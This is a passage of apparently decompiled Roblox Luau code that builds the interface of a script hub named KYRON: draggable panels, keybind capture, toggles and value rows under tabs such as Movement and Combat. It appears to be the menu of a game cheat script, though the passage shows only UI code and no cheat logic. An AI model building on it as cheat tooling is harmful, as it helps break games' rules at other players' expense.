            tbl38.tween(chevron, "rotate", 0.18, { Rotation = arg2 and 180 or 0 })
          end
        end

        tbl38.gallery = function(arg, arg2, arg3)
          arg.BackgroundColor3 = Color3.fromRGB(9, 6, 6)
          arg:SetAttribute("_KYRONNoInvert", true)
          local uiGradient = arg:FindFirstChildOfClass("UIGradient")

          if uiGradient then
            uiGradient.Color = ColorSequence.new(Color3.fromRGB(255, 240, 255), Color3.fromRGB(170, 170, 170))
            uiGradient.Rotation = 90
          end

          local uiStroke = Instance.new("UIStroke", arg)
          uiStroke.Color = Color3.fromRGB(255, 240, 255)
          uiStroke.Transparency = 0.82
          uiStroke.Thickness = 1
          uiStroke:SetAttribute("_NoKYRONTheme", true)
          arg3.Font = Enum.Font.GothamBold
          arg3.TextSize = 15
          arg3.TextColor3 = Color3.fromRGB(245, 245, 245)
          arg3.Size = UDim2.new(1, -44, 1, 0)
          arg3:SetAttribute("_NoKYRONTheme", true)
          local frame2 = Instance.new("Frame", arg2)
          frame2.Name = "HeaderRule"
          frame2.BorderSizePixel = 0
          frame2.BackgroundColor3 = Color3.fromRGB(255, 240, 255)
          frame2.BackgroundTransparency = 0.9
          frame2.Position = UDim2.new(0, 0, 1, -3)
          frame2.Size = UDim2.new(1, 0, 0, 1)
          frame2.ZIndex = arg2.ZIndex + 1
          frame2:SetAttribute("_NoKYRONTheme", true)
          local uiScale = Instance.new("UIScale", arg)
          local flag28 = false
          local n34 = 0

          return function(arg4)
            n34 += 1
            local v86 = n34

            if arg4 then
              if not arg.Visible then
                uiScale.Scale = 0.965
                arg.GroupTransparency = 1
              end

              flag28 = true
              arg.Visible = true
              tbl38.tween(uiScale, "reveal", 0.22, { Scale = 1 })
              tbl38.tween(arg, "reveal", 0.22, { GroupTransparency = 0 })
            else
              flag28 = false
              tbl38.tween(uiScale, "reveal", 0.16, { Scale = 0.98 })

              tbl38.tween(arg, "reveal", 0.16, { GroupTransparency = 1 }).Completed:Once(function()
                if n34 == v86 and not flag28 then
                  arg.Visible = false
                end
              end)
            end
          end
        end

        fn58 = function(parent, text, textSize, position, font2, textColor3, textXAlignment)
          local instance2 = Instance.new("TextLabel")
          instance2.BackgroundTransparency = 1
          instance2.Text = text
          instance2.TextColor3 = textColor3 or tbl37.text
          instance2.TextSize = textSize
          instance2.Font = font2 or Enum.Font.GothamBlack
          instance2.TextXAlignment = textXAlignment or Enum.TextXAlignment.Left
          instance2.TextYAlignment = Enum.TextYAlignment.Center
          instance2.Position = position or UDim2.new()
          instance2.Size = UDim2.new(1, 0, 1, 0)
          instance2.Parent = parent
          return instance2
        end

        local frame2 = Instance.new("Frame")
        frame2.Name = "TopBar"
        frame2.BackgroundColor3 = tbl37.bg
        frame2.BackgroundTransparency = 1
        frame2.BorderSizePixel = 0
        frame2.Size = UDim2.new(1, 0, 0, 74)
        frame2.Parent = screenGui
        local frame3 = Instance.new("Frame")
        frame3.BackgroundColor3 = tbl37.accent
        frame3.BorderSizePixel = 0
        frame3.Size = UDim2.new(1, 0, 0, 1)
        frame3.Position = UDim2.new(0, 0, 1, -1)
        frame3.Visible = false
        frame3.Parent = frame2
        local gothamBlack = Enum.Font.GothamBlack
        local text = tbl37.text
        v84 = fn58(frame2, "PING: --", 13, UDim2.new(0, 14, 0, 0), gothamBlack, text)
        v84.Size = UDim2.new(0, 180, 1, 0)
        v84.Visible = false
        local gothamBlack2 = Enum.Font.GothamBlack
        local text2 = tbl37.text
        local right = Enum.TextXAlignment.Right
        v85 = fn58(frame2, "FPS: --", 13, UDim2.new(1, -194, 0, 0), gothamBlack2, text2, right)
        v85.Size = UDim2.new(0, 160, 1, 0)
        v85.Visible = false
        instance = Instance.new("TextButton")
        instance.Name = "KYRONLogo"
        instance.Visible = false
        instance.BackgroundColor3 = tbl37.key
        instance.Text = ""
        instance.TextColor3 = tbl37.text
        instance.TextSize = 14
        instance.Font = Enum.Font.GothamBlack
        instance.Size = UDim2.new(0, 46, 0, 46)
        instance.Position = UDim2.new(0.5, -34, 0, 12)
        instance.AutoButtonColor = false
        instance.Parent = frame2
        fn56(instance, 23)
        createUIStroke(instance, 0.18)
      end

      local instance2 = Instance.new("Frame")
      instance2.BackgroundColor3 = tbl37.text
      instance2.BackgroundTransparency = 0.18
      instance2.BorderSizePixel = 0
      instance2.Size = UDim2.new(0, 16, 0, 16)
      instance2.Position = UDim2.new(0.5, -8, 0.5, -8)
      instance2.Parent = instance
      fn56(instance2, 8)
      local frame2
      frame2 = Instance.new("Frame")
      frame2.Name = "Main"
      frame2.BackgroundColor3 = tbl37.panel
      frame2.BackgroundTransparency = 1
      frame2.BorderSizePixel = 0
      frame2.AnchorPoint = Vector2.new(0, 0.5)
      frame2.Size = UDim2.new(0, 460, 0, 560)
      local udim2
      udim2 = UDim2.new(0, 20, 0.5, 0)
      frame2.Position = udim2

      if type(_G._KYRONMainPos) == "table" and type(_G._KYRONMainPos.xs) == "number" then
        frame2.Position = UDim2.new(_G._KYRONMainPos.xs, _G._KYRONMainPos.xo or 0, _G._KYRONMainPos.ys, _G._KYRONMainPos.yo or 0)
      end

      frame2.Visible = false
      frame2.ClipsDescendants = true
      frame2.Parent = screenGui
      fn56(frame2, 14)
      fn57(frame2, 1.2)
      local position
      position = frame2.Position
      _G._KYRONRegisterMainUiInteraction = nil

      local function fn59()
        do
          task.delay(0.15, function()
            local currentCamera = workspace.CurrentCamera
            if not currentCamera or not frame2.Parent then
              return
            end
            local viewportSize = currentCamera.ViewportSize
            local absolutePosition = frame2.AbsolutePosition
            local absoluteSize = frame2.AbsoluteSize

            if absolutePosition.X < -absoluteSize.X + 48 or absolutePosition.Y < -absoluteSize.Y + 48 or absolutePosition.X > viewportSize.X - 48 or absolutePosition.Y > viewportSize.Y - 48 then
              frame2.Position = udim2
              position = udim2
              _G._KYRONMainPos = nil
            end
          end)

          return
        end
      end

      fn59()
      local frame3
      frame3 = Instance.new("Frame")
      frame3.Name = "KYRONFloatOpen"
      frame3.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
      frame3.BackgroundTransparency = 0
      frame3.BorderSizePixel = 0
      frame3.Size = UDim2.new(0, 110, 0, 32)
      frame3.ClipsDescendants = true
      frame3.Visible = false
      frame3.ZIndex = 500
      frame3.Active = true
      frame3.Parent = screenGui
      Instance.new("UICorner", frame3).CornerRadius = UDim.new(1, 0)
      local imageButton
      imageButton = Instance.new("ImageButton", frame3)
      imageButton.Size = UDim2.new(1, -2, 1, -2)
      imageButton.Position = UDim2.new(0, 1, 0, 1)
      imageButton.BackgroundTransparency = 1
      imageButton.Image = "rbxassetid://120125107258619"
      imageButton.ScaleType = Enum.ScaleType.Fit
      imageButton.AutoButtonColor = false
      imageButton.ZIndex = 501

      local function fn60()
        local currentCamera = workspace.CurrentCamera
        if not currentCamera then
          return
        end
        local viewportSize = currentCamera.ViewportSize
        local x = frame3.AbsolutePosition.X
        local y = frame3.AbsolutePosition.Y

        if x < 0 or y < 0 or x > viewportSize.X - frame3.Size.X.Offset or y > viewportSize.Y - frame3.Size.Y.Offset then
          frame3.Position = UDim2.new(0, 14, 0.48, 0)
          _G._KYRONFloatBtnPos = nil
        end
      end

      if type(_G._KYRONFloatBtnPos) == "table" and type(_G._KYRONFloatBtnPos.xs) == "number" then
        frame3.Position = UDim2.new(_G._KYRONFloatBtnPos.xs, _G._KYRONFloatBtnPos.xo or 0, _G._KYRONFloatBtnPos.ys, _G._KYRONFloatBtnPos.yo or 0)
      else
        frame3.Position = UDim2.new(0, 14, 0.4, 0)
      end

      task.defer(fn60)

      do
        local flag28 = false
        local position2 = nil
        local position3 = nil
        local v86 = nil
        local flag29 = false

        local function fn61(input)
          if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            flag28 = true
            flag29 = false
            position2 = input.Position
            position3 = frame3.Position
            v86 = input
          end
        end

        frame3.InputBegan:Connect(fn61)
        imageButton.InputBegan:Connect(fn61)

        UserInputService.InputChanged:Connect(function(input)
          if not flag28 then
            return
          end

          if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
            local n34 = input.Position - position2
            local flag30 = math.abs(n34.X) > 6
            local flag31

            if flag30 then
              flag31 = flag30
            else
              local v87 = 5
              flag31 = math.abs(n34.Y) > v87
            end

            if flag31 then
              flag29 = true
            end

            frame3.Position = UDim2.new(position3.X.Scale, position3.X.Offset + n34.X, position3.Y.Scale, position3.Y.Offset + n34.Y)
          end
        end)

        UserInputService.InputEnded:Connect(function(input)
          if input == v86 then
            flag28 = false
            v86 = nil

            _G._KYRONFloatBtnPos = {
              xs = frame3.Position.X.Scale,
              xo = frame3.Position.X.Offset,
              ys = frame3.Position.Y.Scale,
              yo = frame3.Position.Y.Offset,
            }

            if autoSaveSettings.auto then
              task.spawn(function()
                pcall(saveKYRONSettings)
              end)
            end
          end
        end)

        imageButton.Activated:Connect(function()
          if flag29 then
            flag29 = false
            return
          end
          frame3.Visible = false

          if _G._KYRONSetOpen then
            _G._KYRONSetOpen(true)
          end
        end)
      end

      _G._KYRONFloatBtn = frame3
      local KYRONUIScale, fn61
      local uiScale = Instance.new("UIScale")
      uiScale.Scale = 1
      uiScale.Parent = frame2
      KYRONUIScale = _G._KYRONUIScale or KYRONSafeModeEnabled and 85 or 100

      fn61 = function()
        local scale = KYRONUIScale / 100

        if uiScale then
          uiScale.Scale = scale
        end

        if mobileScale then
          mobileScale.Scale = 1
        end
      end

      local v86
      v86 = nil
      local instance3
      instance3 = Instance.new("ImageLabel")
      instance3.Name = "BackgroundAsset"
      instance3.BackgroundTransparency = 1
      instance3.Image = "rbxassetid://88369503310562"
      instance3.ScaleType = Enum.ScaleType.Stretch
      instance3.Size = UDim2.new(1, -132, 1, 0)
      instance3.Position = UDim2.new(0, 132, 0, 0)
      instance3.ZIndex = 1
      instance3.Parent = frame2
      fn56(instance3, 14)
      local instance4
      instance4 = Instance.new("ImageLabel")
      instance4.Name = "LogoAsset"
      instance4.BackgroundTransparency = 1
      instance4.Image = "rbxassetid://120125107258619"
      instance4.ScaleType = Enum.ScaleType.Fit
      instance4.Size = UDim2.new(0, 250, 0, 112)
      instance4.Position = UDim2.new(0, 172, 0, -4)
      instance4.ZIndex = 2
      instance4.Parent = frame2

      do
        local gothamBlack = Enum.Font.GothamBlack
        local text = tbl37.text
        local center = Enum.TextXAlignment.Center
        local v87 = fn58(frame2, "", 17, UDim2.new(0, 0, 0, 78), gothamBlack, text, center)
        v87.Size = UDim2.new(1, 0, 0, 28)
        v87.ZIndex = 3
        v87.Visible = false
      end

      local textButton
      textButton = Instance.new("TextButton")
      textButton.Name = "Close"
      textButton.BackgroundColor3 = tbl37.row
      textButton.BackgroundTransparency = 1
      textButton.Text = "-"
      textButton.TextColor3 = tbl37.text
      textButton.TextSize = 14
      textButton.Font = Enum.Font.GothamMedium
      textButton.Size = UDim2.new(0, 24, 0, 28)
      textButton.Position = UDim2.new(1, -25, 0, 7)
      textButton.AutoButtonColor = false
      textButton.Parent = frame2
      textButton.ZIndex = 4
      fn56(textButton, 6)

      textButton.MouseEnter:Connect(function()
        tbl38.tween(textButton, "hover", 0.14, { BackgroundTransparency = 0.4 })
      end)

      textButton.MouseLeave:Connect(function()
        tbl38.tween(textButton, "hover", 0.14, { BackgroundTransparency = 1 })
      end)

      local instance5, tbl39, tbl40, v87, tbl41, createScrollingFrame

      do
        local instance6 = Instance.new("Frame")
        instance6.Name = "Content"
        instance6.BackgroundTransparency = 1
        instance6.Position = UDim2.new(0, 132, 0, 104)
        instance6.Size = UDim2.new(1, -142, 1, -116)
        instance6.ZIndex = 3
        instance6.Parent = frame2
        instance5 = Instance.new("Frame")
        instance5.Name = "Tabs"
        instance5.BackgroundColor3 = Color3.fromRGB(9, 9, 12)
        instance5.BackgroundTransparency = 0.08
        instance5.Position = UDim2.new(0, 8, 0, 150)
        instance5.Size = UDim2.new(0, 114, 1, -162)
        instance5.ZIndex = 3
        instance5.Parent = frame2
        Instance.new("UICorner", instance5).CornerRadius = UDim.new(0, 10)
        local categoryRailStroke = Instance.new("UIStroke")
        categoryRailStroke.Color = Color3.fromRGB(75, 75, 84)
        categoryRailStroke.Thickness = 1
        categoryRailStroke.Transparency = 0.35
        categoryRailStroke.Parent = instance5

        -- Player headshot preview above the category rail.
        local avatarCard = Instance.new("Frame")
        avatarCard.Name = "KYRONAvatarCard"
        avatarCard.BackgroundColor3 = Color3.fromRGB(8, 8, 12)
        avatarCard.BackgroundTransparency = 1
        avatarCard.BorderSizePixel = 0
        avatarCard.Position = UDim2.new(0, 8, 0, 78)
        avatarCard.Size = UDim2.new(0, 114, 0, 60)
        avatarCard.ZIndex = 5
        avatarCard.Parent = frame2
        local avatarImage = Instance.new("ImageLabel")
        avatarImage.Name = "KYRONAvatarIcon"
        avatarImage.BackgroundTransparency = 1
        avatarImage.Size = UDim2.fromOffset(58, 58)
        avatarImage.Position = UDim2.new(0.5, -29, 0, 0)
        avatarImage.Image = ""
        avatarImage.ScaleType = Enum.ScaleType.Crop
        avatarImage.ZIndex = 6
        avatarImage.Parent = avatarCard
        Instance.new("UICorner", avatarImage).CornerRadius = UDim.new(1, 0)
        task.spawn(function()
          local ok, thumbnail = pcall(function()
            return Players:GetUserThumbnailAsync(
              localPlayer.UserId,
              Enum.ThumbnailType.AvatarBust,
              Enum.ThumbnailSize.Size420x420
            )
          end)
          if ok and avatarImage.Parent then
            avatarImage.Image = thumbnail
          end
        end)
        local avatarImageStroke = Instance.new("UIStroke")
        avatarImageStroke.Color = tbl37.accent
        avatarImageStroke.Thickness = 2
        avatarImageStroke.Transparency = 0.12
        avatarImageStroke.Parent = avatarImage

        _G._KYRONIdleFadeTargets = { textButton, instance6, instance5, avatarCard }
        local flag28 = false
        local flag29 = false
        local v88 = nil
        local position2 = nil
        local position3 = nil

        local function fn62(arg)
          local n34 = arg.Position - position2

          if not flag29 then
            local v89 = 5
            if math.abs(n34.X) < v89 and math.abs(n34.Y) < 6 then
              return
            end
            flag29 = true
          end

          frame2.Position = UDim2.new(position3.X.Scale, position3.X.Offset + n34.X, position3.Y.Scale, position3.Y.Offset + n34.Y)
          position = frame2.Position
        end

        frame2.InputBegan:Connect(function(input)
          if input.UserInputType ~= Enum.UserInputType.MouseButton1 and input.UserInputType ~= Enum.UserInputType.Touch then
            return
          end
          flag28 = true
          flag29 = false
          position2 = input.Position
          position3 = frame2.Position
          v88 = input
        end)

        UserInputService.InputEnded:Connect(function(input)
          if input == v88 then
            flag28 = false
            v88 = nil

            if flag29 then
              _G._KYRONMainPos = {
                xs = frame2.Position.X.Scale,
                xo = frame2.Position.X.Offset,
                ys = frame2.Position.Y.Scale,
                yo = frame2.Position.Y.Offset,
              }

              if autoSaveSettings.auto then
                task.spawn(function()
                  pcall(saveKYRONSettings)
                end)
              end
            end
          end
        end)

        UserInputService.InputChanged:Connect(function(input)
          if not flag28 then
            return
          end

          if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
            fn62(input)
          end
        end)

        local uiListLayout = Instance.new("UIListLayout")
        uiListLayout.FillDirection = Enum.FillDirection.Vertical
        uiListLayout.Padding = UDim.new(0, 8)
        uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
        uiListLayout.Parent = instance5
        tbl39 = {}
        tbl40 = {}
        v87 = nil
        tbl41 = {}

        createScrollingFrame = function(name)
          local scrollingFrame = Instance.new("ScrollingFrame")
          scrollingFrame.Name = name
          scrollingFrame.BackgroundTransparency = 1
          scrollingFrame.BorderSizePixel = 0
          scrollingFrame.ScrollBarThickness = 0
          scrollingFrame.ScrollBarImageColor3 = tbl37.text
          scrollingFrame.ScrollBarImageTransparency = 1
          scrollingFrame.CanvasSize = UDim2.new()
          scrollingFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
          scrollingFrame.Size = UDim2.new(1, 0, 1, 0)
          scrollingFrame.ZIndex = 3
          scrollingFrame.Visible = false
          scrollingFrame.Parent = instance6
          local uiListLayout2 = Instance.new("UIListLayout")
          uiListLayout2.Padding = UDim.new(0, 7)
          uiListLayout2.SortOrder = Enum.SortOrder.LayoutOrder
          uiListLayout2.Parent = scrollingFrame
          tbl39[name] = scrollingFrame
          return scrollingFrame
        end
      end

      local createTextLabel

      createTextLabel = function(parent, arg)
        local textLabel = Instance.new("TextLabel")
        textLabel.Name = "Section_" .. arg
        textLabel.BackgroundTransparency = 1
        textLabel.Text = string.upper(arg)
        textLabel.TextColor3 = tbl37.text
        textLabel.TextSize = 11
        textLabel.Font = Enum.Font.GothamBlack
        textLabel.TextXAlignment = Enum.TextXAlignment.Left
        textLabel.Size = UDim2.new(1, -6, 0, 26)
        textLabel.ZIndex = 4
        textLabel.Parent = parent
        return textLabel
      end

      local createTextButton

      createTextButton = function(parent, text, arg)
        local textButton2 = Instance.new("TextButton")
        textButton2.BackgroundColor3 = tbl37.key
        textButton2.BackgroundTransparency = 0.18
        textButton2.Text = text
        textButton2.TextColor3 = tbl37.text
        textButton2.TextSize = 12
        textButton2.Font = Enum.Font.GothamMedium
        textButton2.Size = UDim2.new(0, arg or 44, 0, 30)
        textButton2.AutoButtonColor = false
        textButton2.ZIndex = 10
        textButton2.Parent = parent
        fn56(textButton2, 7)
        fn57(textButton2, 1)
        return textButton2
      end

      local createUIStroke

      createUIStroke = function(parent)
        parent.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        parent.BackgroundTransparency = 0.3

        parent.BorderSizePixel = 0
        (parent:FindFirstChildOfClass("UICorner") or fn56(parent, 999)).CornerRadius = UDim.new(1, 0)
        local uiStroke = parent:FindFirstChildOfClass("UIStroke")

        if uiStroke then
          uiStroke:Destroy()
        end

        local uiStroke2 = Instance.new("UIStroke")
        uiStroke2.Name = "SelectorPillBorder"
        uiStroke2.Color = Color3.fromRGB(37, 37, 43)
        uiStroke2.Thickness = 1
        uiStroke2.Transparency = 0.16
        uiStroke2.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
        uiStroke2.Parent = parent
        return uiStroke2
      end

      local fn62

      fn62 = function(arg, size, position2)
        arg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        arg.BackgroundTransparency = 0.38
        arg.BorderSizePixel = 0
        arg.Size = size
        arg.Position = position2
        arg.TextColor3 = tbl37.text
        arg.TextSize = 16
        arg.Font = Enum.Font.GothamBlack
        local uiStroke = arg:FindFirstChildOfClass("UIStroke")

        if uiStroke then
          uiStroke:Destroy()
        end
        (arg:FindFirstChildOfClass("UICorner") or fn56(arg, 999)).CornerRadius = UDim.new(1, 0)
        return arg
      end

      local tbl42, fn63

      do
        local function fn64(arg)
          if v87 then
            v87.Text = v87:GetAttribute("OldText") or "..."
          end

          v87 = arg
          arg:SetAttribute("OldText", arg.Text)
          arg.Text = "..."
        end

        tbl42 = {
          LeftControl = "LCTRL",
          RightControl = "RCTRL",
          LeftShift = "LSHFT",
          RightShift = "RSHFT",
          LeftAlt = "LALT",
          RightAlt = "RALT",
          LeftMeta = "LMETA",
          RightMeta = "RMETA",
          CapsLock = "CAPS",
          Backspace = "BKSP",
          PageUp = "PGUP",
          PageDown = "PGDN",
          Delete = "DEL",
          Insert = "INS",
          Escape = "ESC",
          Return = "ENTER",
          Space = "SPACE",
          Tab = "TAB",
          Up = "UP",
          Down = "DOWN",
          Left = "LEFT",
          Right = "RIGHT",
          ButtonA = "A",
          ButtonB = "B",
          ButtonX = "X",
          ButtonY = "Y",
          ButtonL1 = "LB",
          ButtonR1 = "RB",
          ButtonL2 = "LT",
          ButtonR2 = "RT",
          ButtonL3 = "LS",
          ButtonR3 = "RS",
          ButtonSelect = "SEL",
          ButtonStart = "STRT",
          DPadUp = "D-UP",
          DPadDown = "D-DN",
          DPadLeft = "D-LF",
          DPadRight = "D-RT",
        }

        UserInputService.InputBegan:Connect(function(input, gameProcessed)
          if not v87 then
            return
          end

          if gameProcessed and not v87:GetAttribute("CtrlOnly") then
            return
          end

          if input.UserInputType == Enum.UserInputType.MouseButton2 then
            return
          end
          local name = input.KeyCode ~= Enum.KeyCode.Unknown and input.KeyCode.Name or input.UserInputType.Name

          if v87:GetAttribute("CtrlOnly") then
            if not (name:sub(1, 6) == "Button" or name:sub(1, 4) == "DPad" or name:sub(1, 5) == "Thumb") then
              return
            end
          end

          local str10 = tbl42[name] or name

          if #str10 > 5 then
            str10 = str10:sub(1, 5)
          end

          local attribute = v87:GetAttribute("KYRONControllerAction")

          if attribute then
            _G._KYRONCtrlSave = _G._KYRONCtrlSave or {}
            _G._KYRONCtrlSave[attribute] = name
            pcall(_G._KYRONPersistControllerBindings)
          end

          v87:SetAttribute("KeyCodeName", name)
          v87.Text = string.upper(str10)
          v87 = nil

          if autoSaveSettings.auto then
            task.spawn(function()
              task.wait(0.05)
              pcall(saveKYRONSettings, true)
            end)
          end
        end)

        local function fn65(parent)
          local instance6 = Instance.new("TextButton")
          instance6.BackgroundTransparency = 1
          instance6.Text = ""
          instance6.Size = UDim2.new(0, 54, 1, 0)
          instance6.Position = UDim2.new(1, -54, 0, 0)
          instance6.AutoButtonColor = false
          instance6.Parent = parent
          local instance7 = Instance.new("Frame")
          instance7.BackgroundColor3 = Color3.fromRGB(92, 92, 100)
          instance7.BackgroundTransparency = 0.08
          instance7.Size = UDim2.new(0, 34, 0, 14)
          instance7.Position = UDim2.new(0.5, -17, 0.5, -9)
          instance7.BorderSizePixel = 0
          instance7.ZIndex = 5
          instance7.Parent = instance6
          instance7:SetAttribute("_KYRONToggleTrack", true)
          instance7:SetAttribute("_KYRONToggleOn", false)
          fn56(instance7, 6)
          fn57(instance7, 1)
          local frame4 = Instance.new("Frame")
          frame4.BackgroundColor3 = Color3.fromRGB(238, 238, 245)
          frame4.Size = UDim2.new(0, 13, 0, 13)
          frame4.Position = UDim2.new(0, 3, 0.5, -6)
          frame4.BorderSizePixel = 0
          frame4.ZIndex = 5
          frame4.Parent = instance7
          frame4:SetAttribute("_KYRONToggleDot", true)
          fn56(frame4, 7)
          local frame5 = Instance.new("Frame")
          frame5.BackgroundColor3 = Color3.fromRGB(255, 255, 240)
          frame5.BackgroundTransparency = 0.72
          frame5.BorderSizePixel = 0
          frame5.ZIndex = 7
          frame5.Size = UDim2.new(1, -4, 0, 4)
          frame5.Position = UDim2.new(0, 2, 0, 2)
          frame5.Parent = frame4
          fn56(frame5, 4)
          local flag28 = false

          instance6.Activated:Connect(function()
            flag28 = not flag28
            TweenService:Create(instance7, TweenInfo.new(0.16), { BackgroundColor3 = flag28 and tbl37.accent or Color3.fromRGB(92, 92, 100) }):Play()

            TweenService:Create(frame4, TweenInfo.new(0.16), {
              BackgroundColor3 = flag28 and Color3.fromRGB(0, 0, 0) or Color3.fromRGB(238, 238, 245),
              Position = flag28 and UDim2.new(1, -16, 0.5, -6) or UDim2.new(0, 3, 0.5, -6),
            }):Play()
          end)
        end

        fn63 = function(parent, name, arg)
          if _G._KYRONVoltCompatibility then
            _G._KYRONVoltRows = (_G._KYRONVoltRows or 0) + 1

            if _G._KYRONVoltRows % 8 == 0 then
              task.wait()
            end
          end

          arg = arg or {}
          local instance6 = Instance.new("Frame")
          instance6.Name = name
          instance6.BackgroundColor3 = tbl37.row
          instance6.BackgroundTransparency = 0.3
          instance6.BorderSizePixel = 0
          instance6.Size = UDim2.new(1, -4, 0, 34)
          instance6.ZIndex = 10
          instance6.Parent = parent
          fn56(instance6, 6)
          local v88, v89 = fn57(instance6, 1.25)
          local gothamMedium = Enum.Font.GothamMedium
          local text = tbl37.text
          local v90 = fn58(instance6, name, 13, UDim2.new(0, 12, 0, 0), gothamMedium, text)
          v90.Size = UDim2.new(1, -132, 1, 0)
          v90.ZIndex = 4

          if arg.arrow then
            local v91 = createTextButton(instance6, "", 34)
            v91.Name = "ArrowButton"
            v91.Size = UDim2.new(0, 38, 0, 26)
            v91.Position = UDim2.new(1, -108, 0.5, -8)
            tbl38.chevron(v91)
          end

          if arg.key then
            local v91 = createTextButton(instance6, (arg.key == "..." or arg.key == "?" or arg.key == "") and "NONE" or arg.key, 56)
            v91.Name = "KeybindButton"
            v91.Size = UDim2.new(0, 56, 0, 22)
            v91.Position = UDim2.new(1, -64, 0.5, -11)

            v91.Activated:Connect(function()
              fn64(v91)
            end)

            local v92 = createTextButton(instance6, "", 18)
            v92.Name = "ClearKeybindButton"
            v92.Size = UDim2.new(0, 14, 0, 18)
            v92.Position = UDim2.new(1, -86, 0.5, -9)
            v92.BackgroundTransparency = 0.08
            local uiCorner = v92:FindFirstChildOfClass("UICorner")

            if uiCorner then
              uiCorner.CornerRadius = UDim.new(1, 0)
            end

            v92.Activated:Connect(function()
              if v87 == v91 then
                v87 = nil
              end

              v91:SetAttribute("KeyCodeName", nil)
              v91.Text = "NONE"
              local attribute = v91:GetAttribute("KYRONControllerAction")

              if attribute then
                _G._KYRONCtrlSave = _G._KYRONCtrlSave or {}
                _G._KYRONCtrlSave[attribute] = "NONE"
                pcall(_G._KYRONPersistControllerBindings)

                if autoSaveSettings.auto then
                  task.spawn(function()
                    pcall(saveKYRONSettings, true)
                  end)
                end
              end
            end)
          end

          if arg.value then
            local textBox = Instance.new("TextBox", instance6)
            textBox.Name = "ValueBox"
            textBox.BackgroundColor3 = tbl37.key
            textBox.BackgroundTransparency = 0.18
            textBox.Text = tostring(arg.value)
            textBox.TextColor3 = tbl37.text
            textBox.TextSize = 12
            textBox.Font = Enum.Font.GothamMedium
            textBox.ClearTextOnFocus = false
            textBox.Size = UDim2.new(0, 58, 0, 24)
            textBox.Position = UDim2.new(1, -68, 0.5, -12)
            textBox.BorderSizePixel = 0
            textBox.ZIndex = 25
            fn56(textBox, 7)
            fn57(textBox, 1)
          end

          if arg.toggle then
            fn65(instance6)
          end

          if arg.button then
            v90.Font = Enum.Font.GothamBlack
            v90.TextXAlignment = Enum.TextXAlignment.Center
            v90.Position = UDim2.new(0, 0, 0, 0)
            v90.Size = UDim2.new(1, arg.key and -56 or 0, 1, 0)
          end

          instance6.MouseEnter:Connect(function()
            TweenService:Create(instance6, TweenInfo.new(0.1), { BackgroundTransparency = 0.2 }):Play()
            v89.Color = v78
            v89.Transparency = v82
          end)

          instance6.MouseLeave:Connect(function()
            TweenService:Create(instance6, TweenInfo.new(0.4), { BackgroundTransparency = 0.3 }):Play()
            v89.Color = v79
            v89.Transparency = v83
          end)

          return instance6
        end
      end

      local fn64, KYRONMobileBtnLocked, tbl43, flag28, KYRONMobilePositionProfile, fn65, createTextButton2, Movement, v88, v89
      local v90, v91, Combat, Keybinds, Controller, Utility

      local function fn77(arg, arg2)
        for _, child in ipairs(arg:GetChildren()) do
          if child:IsA("Frame") and child.Name == arg2 then
            return child
          end
        end
      end

      local handlers = {}

      local function fn78(arg, arg2, arg3)
        local v95 = fn77(arg, arg2)
        if not v95 then
          return
        end
        local v96 = nil

        for _, descendant in ipairs(v95:GetDescendants()) do
          if descendant:IsA("TextButton") and descendant.Size == UDim2.new(0, 54, 1, 0) then
            v96 = descendant
            break
          else
            v96 = nil
          end
        end

        if not v96 then
          return
        end
        local frame6 = v96:FindFirstChildOfClass("Frame")
        local frame7 = frame6 and frame6:FindFirstChildOfClass("Frame")
        local flag29 = false

        local function fn79(arg4, arg5)
          local flag30 = arg4 ~= flag29
          flag29 = arg4
          local color2 = tbl37.accent.R > 0.98 and tbl37.accent.G > 0.98 and tbl37.accent.B > 0.98 and Color3.fromRGB(0, 0, 0) or tbl37.accent

          if frame6 then
            frame6:SetAttribute("_KYRONToggleOn", flag29)

            TweenService:Create(frame6, TweenInfo.new(0.16), {
              BackgroundColor3 = flag29 and tbl37.accent or Color3.fromRGB(92, 92, 100),
            }):Play()
          end

          if frame7 then
            TweenService:Create(frame7, TweenInfo.new(0.16), {
              BackgroundColor3 = _G._KYRONInvertUI and Color3.fromRGB(0, 0, 0) or flag29 and Color3.fromRGB(0, 0, 0) or Color3.fromRGB(238, 238, 245),
              Position = flag29 and UDim2.new(1, -16, 0.5, -6) or UDim2.new(0, 3, 0.5, -6),
            }):Play()
          end

          if flag30 and not arg5 then
            pcall(arg3, flag29)

            if autoSaveSettings.auto then
              task.spawn(function()
                pcall(saveKYRONSettings)
              end)
            end
          end
        end

        local textButton2 = Instance.new("TextButton", v96)
        textButton2.BackgroundTransparency = 1
        textButton2.Text = ""
        textButton2.Size = UDim2.new(1, 0, 1, 0)
        textButton2.ZIndex = 100
        textButton2.AutoButtonColor = false

        textButton2.Activated:Connect(function()
          fn79(not flag29, false)
        end)

        handlers[arg2] = fn79
      end

      do
        local function fn66(arg, arg2, arg3)
          local v92 = fn63(arg, arg2)
          v92.BackgroundTransparency = 0.42
          local v93 = v92:FindFirstChildOfClass("TextLabel")

          if v93 then
            v93.Text = "MODE"
            v93.TextSize = 11
          end

          local v94 = 16
          local gothamMedium = Enum.Font.GothamMedium
          local text = tbl37.text
          local right = Enum.TextXAlignment.Right
          local v95 = fn58(v92, string.upper(arg3), v94, UDim2.new(1, -150, 0, 0), gothamMedium, text, right)
          v95.Name = "ModeValue"
          v95.Size = UDim2.new(0, 138, 1, 0)
          v95.ZIndex = 6
          local instance6 = Instance.new("TextButton", v92)
          instance6.Name = "ModeClick"
          instance6.BackgroundTransparency = 1
          instance6.Text = ""
          instance6.Size = UDim2.new(1, 0, 1, 0)
          instance6.AutoButtonColor = false
          instance6.ZIndex = 25
          return v92, v95, instance6
        end

        fn64 = function(arg, arg2, arg3, arg4, arg5, arg6, arg7)
          local v92 = fn63(arg, arg2)
          local v93 = createTextButton(v92, "<", 28)
          v93.Name = "Minus"
          v93.Font = Enum.Font.GothamBlack
          v93.Position = UDim2.new(1, -126, 0.5, -12)
          local textBox = Instance.new("TextBox", v92)
          textBox.Name = "StepperValue"
